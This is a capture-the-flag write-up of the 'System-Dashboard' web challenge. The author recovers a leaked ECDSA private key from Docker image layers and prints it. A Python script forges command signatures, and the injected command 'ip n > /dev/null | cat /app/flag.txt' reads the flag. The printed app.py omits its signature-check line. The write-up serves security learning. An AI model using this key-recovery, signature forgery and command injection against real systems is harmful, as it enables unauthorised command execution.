<h3>#3 Challenge: System-Dashboard</h3><br></br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/chimg3.png" style="height: 80px;">
<br></br>
<h4><i>Challenge description:</i></h4>

<blockquote>
	<h5><i>Introduction</i></h5>
	<p>In this challenge you need to take a closer look at a customizable system dashboard which allows you to run commands on a server. It even features a customizable version to run on your own server!</p>
</blockquote>

<blockquote>
	<h5>Goal</h5>
	<p>Exploit the service to run your own commands and extract the flag in <code>/app/flag.txt.</code></p>
</blockquote>

<blockquote>
	<h5>NOTES</h5>
	<ul>
		<li>Outgoing network connections are blocked for security reasons (a reverse shell will not function)</li>
		<li>The flag is currently only accepted while the container is <i>running</i></li>
        <li>If you get an invalid flag message, please restart the container and re-run the exploit</li>
	</ul>
</blockquote>


<h4><i>Intro/Thought process</i></h4>

<p>This challenge had a web app and docker image file that we can set up in our local environment. The app itself has shell commands that user can execute on the server and get responses back about files, directories, etc.
The commands were:
<ul>
 <li>ip a</li>
 <li>ip n</li>
 <li>ip r</li>
 <li>free -m</li>
 <li>id</li>
 <li>find /app/</li>
 <li>stat /app/flag.txt</li>
</ul>
<br>
</br>
Since I was interested in the flag, I've checked the response for that stat command which looked something like this:<br>  
<blockquote>
<pre>
# stat /app/flag.txt
  File: /app/flag.txt
  Size: 37        	Blocks: 8          IO Block: 4096   regular file
Device: 88h/136d	Inode: 39161546    Links: 1
Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2021-08-19 18:34:01.684160766 +0000
Modify: 2021-08-19 18:34:01.684160766 +0000
Change: 2021-08-19 18:34:01.684160766 +0000
</pre>
</blockquote>

Nothing seemed unusual there, this challenge though does require some "digital forensics". Responses of other commands looked like this:<br>  


<blockquote>
  <pre>
   # ip a
   1: lo: LOOPBACK,UP,LOWER_UP mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   25370: eth0@if25371: BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN mtu 1500 qdisc noqueue state UP
    link/ether 02:42:0a:97:00:08 brd ff:ff:ff:ff:ff:ff
    inet 10.151.0.8/16 brd 10.151.255.255 scope global eth0
       valid_lft forever preferred_lft forever
  </pre>
  <pre>
   # ip n
   10.151.0.1 dev eth0 lladdr 02:42:16:44:21:79 ref 1 used 0/0/0 probes 4 DELAY
  </pre>
  <pre>
   # ip r
   default via 10.151.0.1 dev eth0
   10.151.0.0/16 dev eth0 scope link  src 10.151.0.8
  </pre>
  <pre>
   # free -m
                 total        used        free      shared  buff/cache   available
   Mem:         128941       19211       27187           0       82541      104824
   Swap:          3071        2224         847
  </pre>
  <pre>
   # id
   Command has not been executed yet. Push the button on top to run it.
  </pre>
  <pre>
   # find /app/
   /app/
   /app/app.py
   /app/requirements.txt
   /app/flag.txt
   /app/config.json
   /app/templates
   /app/templates/index.html
  </pre>
</blockquote>
I decided to pull that docker image and set it up locally to see what is in that /app/ directory.
</p>
<br>
</br>
<h4><i>Docker inspection</i></h4>

<p>
After setting up docker and running the image I could see the <code>app.py</code> source code:


```python
from flask import Flask, request, abort, render_template
import ecdsa

import json
import os
import base64
import subprocess

app = Flask(__name__)

with open('/app/config.json') as f:
    CONFIG = json.loads(f.read())
    for i, command in enumerate(CONFIG['allowedCommands']):
        command['id'] = f'cmd-{i}'
    NONCE = base64.b64decode(CONFIG['nonce'])
    KEY = ecdsa.VerifyingKey.from_pem(
        base64.b64decode(CONFIG['verifyingKey'])
    )

@app.route('/', methods=["GET", "POST"])
def index():
    stdout = None

    if request.method == 'POST':
        cmd = request.form['cmd']
        sig = base64.b64decode(request.form['sig'])
        
        try:
            
                abort(403)
        except ecdsa.BadSignatureError as e:
            abort(403)
        
        try:
            stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')
        except subprocess.CalledProcessError as e:
            stdout = 'Command exited with return code {}'.format(e.returncode)
    else:
        cmd = CONFIG['allowedCommands'][0]['command']

    return render_template(
        'index.html',
        commands=CONFIG['allowedCommands'],
        cmd=cmd,
        stdout=stdout
    )
    
```

Commands were signed, and verified by the key that is in the config.json file. Every command has its own signature which is being verified as "NONCE + command" which is quite interesting.   
I am talking about this line <code>if not KEY.verify(sig, NONCE + cmd.encode('utf-8')):</code>

The <i>config.json</i>:  
```json
{
  "nonce": "CgSLnVZKS6e3lOAnc/k57w==",
  "verifyingKey": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUZZd0VBWUhLb1pJemowQ0FRWUZLNEVFQUFvRFFnQUVLZjcwTnB5OU5LdGdSckRJM3dPWWEyTFpIbmNDY295VQpPaTQxdUwvckZNKzZacDI3QlBZK2tRQ214R1hQU2hLdkU3OU9RS3NOSDd6OUhMT1BVSnJBQlE9PQotLS0tLUVORCBQVUJMSUMgS0VZLS0tLS0K",
  "allowedCommands": [
    {
      "title": "Addresses",
      "command": "ip a",
      "icon": "envelope",
      "signature": "8Y2R5HolwKmLIG/DqzLpy/PnEvhFcvamA7ux9hxb4Fpor5g6AtB56Wx58QBM8T+RpqE3Rk6WSqS3DAxC81o5jg=="
    },
    {
      "title": "Neighborhood",
      "command": "ip n",
      "icon": "home",
      "signature": "N12kSPVgB0aXuj2+3F9ZdoijC5V2040TLqifpPoKuXitOfgaaxXdCNwXI8hE9vjU9G8kln7n/QhfHLodyJuKPg=="
    },
    {
      "title": "Routes",
      "command": "ip r",
      "icon": "random",
      "signature": "/8B5k54Q2B8VcxnaTy31Q59Ufotrxejlu+utkK0TGjRepYPQDgTgTBf27P/5bD7Ls7v4lVbkp/lJICHlVwbUjw=="
    },
    {
      "title": "Memory usage",
      "command": "free -m",
      "icon": "blackboard",
      "signature": "UkibBIDjAd/Qa/JAl4UF7alNF7GduBVfYZ4eZIBjOIVaT7qxWqySwts8wZaueLhUIZXD2v1H9K/onN6GVWrvig=="
    },
    {
      "title": "User Information",
      "command": "id",
      "icon": "user",
      "signature": "AdM4XJ+nOpHYE2xZW1pSPBYD2YxPaRuN2KLIKfzlmHdU50ZuVpsd1oamPWNvVMbrKXcUEJVKpAHXA3VidH3vgg=="
    },
    {
      "title": "List files",
      "command": "find /app/",
      "icon": "folder-open",
      "signature": "Kn5kWYky+ryDiETVvm7p6PIFwaXhSmX/35TCSHArrsP4V0VMx+0aAEFWUG8Y2Iw6resyVvC0fVe5l7YFVBvNYg=="
    },
    {
      "title": "Show file information",
      "command": "stat /app/flag.txt",
      "icon": "search",
      "signature": "p4wDngfxNN2MNyiNGQ3dF1rcfbWXj9r224azz7QhlNjWRCtJNl/uPp/0YuMhk6L6i9r99WdNiIQBovwFprWn+g=="
    }
  ]
}

```

Since those are <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm">ecdsa's</a> signatures, I was hoping this will be one of those <a href="https://billatnapier.medium.com/ecdsa-weakness-where-nonces-are-reused-2be63856a01ab">nonce reusable attacks</a>, but that wasn't the case, as you can see all those signature don't have common starting bytes so the same nonce wasn't used in process of signing. And from previous source code, key verification was using nonce + command to verify signature, which means nonce was used as salt.<br></br>
I've continued exploring around to see if there is anything more interesting out there but there was nothing that caught my eye, at this point I was checking for various python libraries that are being used and their versions in hope there is some sort of already known vulnerability. After some time of enumeration I looked up what are common forensics practices for docker. One of the things that popped was a tool called <a href="https://github.com/wagoodman/dive" >dive</a>. Dive is basically a tool for exploring docker images and layers.
</p>

<br>
</br>
<p>Fortunately I found something interesting in one of the layers</p>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/dive1.png">
<br>
</br>
<p>There were two interesting scripts added: register-commands.py and register-commands.sh. I quickly looked for those file, there are multiple ways of searching through docker overlay2 directory, I am specifically looking for diff on those scripts</p>

```bash
   ls -la /var/lib/docker/overlay2/*/diff/register-commands.py && ls -la /var/lib/docker/overlay2/*/diff/register-commands.sh
```

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/rcom.png">

The content looked pretty interesting:

```bash
#!/bin/bash
set -euo pipefail

DIR=$(mktemp -d)
cd $DIR
FILE=$(mktemp)

# Generate key
openssl ecparam -name secp256k1 -genkey -noout -out $FILE

# Register commands
exec /register-commands.py $FILE "$ALLOWED_COMMANDS"

# Clean up
rm -f $FILE
```

```python
#!/usr/bin/env python3
from ecdsa import SigningKey, SECP256k1

import os
import sys
import random
import json
import base64

def b64encode(b):
    return base64.b64encode(b).decode('utf-8')

with open(sys.argv[1], 'rb') as f:
    sk = SigningKey.from_pem(f.read())

nonce = os.urandom(16)

config = {
    "nonce": b64encode(nonce),
    "verifyingKey": b64encode(sk.get_verifying_key().to_pem()),
    "allowedCommands": []
}

for x in sys.argv[2].split(';'):
    title, icon, cmd = x.split(':')
    config["allowedCommands"].append({
        "title": title,
        "command": cmd,
        "icon": icon,
        "signature": b64encode(sk.sign_deterministic(nonce + cmd.encode('utf-8'))),
    })

with open('/app/config.json', 'w') as f:
    f.write(json.dumps(config))
```

In that bash script the Private key is being generated as a tmp file using mktemp command, I decided to take a look back to the dive layer inspector and check if there are any changes in the tmp directory.<br></br>
And there were changes indeed:  

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/tmp.png">

I searched for tmp directory in layer and I found private key

<pre>
-----BEGIN EC PRIVATE KEY-----
MHQCAQEEIJGnfhY+o/20Okl35KUWNDtw/8oMTQCGgFo5YVlg1P8moAcGBSuBBAAK
oUQDQgAEKf70Npy9NKtgRrDI3wOYa2LZHncCcoyUOi41uL/rFM+6Zp27BPY+kQCm
xGXPShKvE79OQKsNH7z9HLOPUJrABQ==
-----END EC PRIVATE KEY-----
</pre>


<h4><i> Getting the flag </i></h4>
<p>
Since I found the private key that is being used to sign the commands, all I need to do is to sign my custom command and print out the flag. I know that the flag is on their server so all I had to do is to cat that file and grab the flag, so a simple python script will do this for me.

```python

from ecdsa import VerifyingKey, SigningKey
from base64 import b64encode, b64decode

nonce = "CgSLnVZKS6e3lOAnc/k57w==" # nonce from config.json
pub = '''
-----BEGIN PUBLIC KEY-----
MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEKf70Npy9NKtgRrDI3wOYa2LZHncCcoyU\nOi41uL/rFM+6Zp27BPY+kQCmxGXPShKvE79OQKsNH7z9HLOPUJrABQ==
-----END PUBLIC KEY-----
'''.strip() # This is Verifying key / pub key from config.json

public_key_ec = VerifyingKey.from_pem(pub)
nonce = b64decode(nonce)

with open("privkey.pem","r") as pk:  # privkey.pem is our tmp file
  pkey = pk.read()
  pkey = SigningKey.from_pem(pkey)
  print('what is pkey', pkey)

cmd1 = b64encode(pkey.sign_deterministic(nonce + b'cat /app/flag.txt')).decode('utf8') # b64 encoded signature 

print(cmd1)
```

Now it was the time to test the signature and get a flag.<br></br>
The form had cmd and sig input fields:

<br></br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/form.png">

so I replaced the cmd to cat the flag, and signature that my script produced.
<code>cmd="cat /app/flag.txt" sig="d0FYclQ9I8eVQWTIg7vUYEY1UUPk0GQkbj03dS2oyvobAjiX45x85LNgIqwaHZfIMayITprlX6XWqApRCFMz5A==" </code>

<p>But I didn't get the flag unfortunately :(<br></br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/noflag.png">

I had to take a look at the template of the page and check if there is any rendering data logic there. And it looks like it was a typical Jinja template.

```html
<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"
        integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
    <title>Status Dashboard</title>
</head>
<body>
    <div class="container">
        <h1><a href="/">Status Dashboard</a></h1>
        <small>Get an quick overview over your system status.</small>
        <div class="row">
            <ul class="nav nav-tabs">
                {% for command in commands %}
                {% set current = cmd and cmd.startswith(command.command) %}
                <li class=" {{ 'show active' if current else '' }}">
                    <a href="#{{ command.id }}" class="list-group-item text-center" data-toggle="tab">
                        <span class="glyphicon glyphicon-{{ command.icon }}"></span>
                        {{ command.title }}
                    </a>
                </li>
                {% endfor %}
            </ul>
            <div class="tab-content">
                {% for command in commands %}
                {% set current = cmd and cmd.startswith(command.command) %}
                <div class="tab-pane {{ 'active' if current else '' }}" id="{{ command.id }}">
                    <div class="container">
                        <h1>{{ command.title }}</h1>
                        {% if current and stdout %}
                        <pre>
                        # {{ command.command }}
                        {{ stdout|wordwrap(120) }}
                        </pre>
                        {% else %}
                        <pre>
                        # {{ command.command }}
                        Command has not been executed yet. Push the button on top to run it.
                        </pre>
                        {% endif %}
                        <form method="POST" action="/">
                            <input type="hidden" name="cmd" value="{{ command.command }}">
                            <input type="hidden" name="sig" value="{{ command.signature }}">
                            <button type="submit" class="btn btn-primary"><span
                                    class="glyphicon glyphicon-refresh"></span></span> Re-run command</button>
                        </form>
                    </div>
                </div>
                {% endfor %}
            </div>
        </div>
        <hr>
        <p><strong>Did you know:</strong> You can use the <a href="https://hub.docker.com/repository/docker/hackinglabchallenges/system-dashboard">System Dashboard</a> to run any other command on your server in a safe way. It's free and very quick to set up!</p>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.min.js"
        integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"
        integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"
        crossorigin="anonymous"></script>
    <script>
        $('.tabs a').click(function (e) {
            e.preventDefault()
            $(this).tab('show')
        });
    </script>

</body>
```
Looking at the tab-content and the container I just have to bypass this simple check
<pre>
 {% for command in commands %}
     {% set current = cmd and cmd.startswith(command.command) %}
        {% if current and stdout %}
          {{ stdout|wordwrap(120) }}
</pre>

We know from app.py that <i>stdout</i> is <pre>stdout = subprocess.check_output(cmd, shell=True).decode('utf-8')</pre>

so bypassing this is quite easy, make your command starts with known "allowed commands" in my example is <code>ip n</code> and redirect its output to /dev/null and pipe it into cat like this:  
<pre>
ip n > /dev/null | cat /app/flag.txt
</pre>
I've resigned this command with that python script that I made earlier and tried making post request once again.<br></br>
And finally got my <b><i>flag</i></b><br></br>
<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/flag.png">
</p>

<img src="https://github.com/0xhebi/BND-Recruitment-2021-CTF-Web-Security/blob/main/System-Dashboard/screenshots/flag2.png">

